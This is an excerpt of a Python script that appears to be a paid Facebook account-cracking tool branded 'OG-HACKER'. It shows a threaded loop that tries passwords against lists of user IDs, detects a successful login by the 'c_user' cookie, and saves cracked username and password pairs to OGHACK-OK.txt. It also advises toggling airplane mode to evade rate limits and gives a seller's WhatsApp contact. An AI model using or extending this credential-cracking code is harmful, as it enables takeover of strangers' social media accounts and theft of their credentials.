...
from concurrent.futures import ThreadPoolExecutor as Jadugarkb
...
def xoshnaw():
  ...
  try:
    ...
    if id in httpCaht:
      print("\033[1;92mYOU PAID FOR THIS...!")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
...
logo="""_________________________________________________________________________
...
|     |    |    ||    |   |    ||    | |    ||    .--.    ||    |   ____ |    |\    \'  
|\     \  /    /||    |   |_,  ||    | |    ||    |  |    ||    |  |    ||    | \    \  
| \_____\/____/ ||\ ___\___/  /||____| |____||____|  |____||\ ___\/    /||____|  \____\ 
 \ |    ||    | /| |   /____ / ||    | |    ||    |  |    || |   /____/ ||    |   |    |
...
THIS TOOL IS MADE IN AMERICAN BY OG-HACKER
DON'T USE THIS TOOL ILLEGAL
 OG HACKER
WHATSAPP--------> +15099035423
VERSION------------> 200.00
_____________________________________________________
USE AIRPLANE MODE EVERY 5MINS FOR 10 SEC
_____________________________________________________"""
...
def Jadugar():
    ...
    print(' [2] exit ')
    print('')
    _Jadugar___ = input(' [?] Choose option : ')
    if _Jadugar___ in ('1', '01'):
        __xxx__().Jadugarx(id)
    if _Jadugar___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r \033[1;92m[CRACKING] {loop}/{len(self.id)} OK={len(ok)}-CP={len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [OGHACK-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('OGHACK-OK.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with Jadugarkb(max_workers=30) as kbworld:
                for mj in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = mj.split('|')
                        xz = name.split(' ')
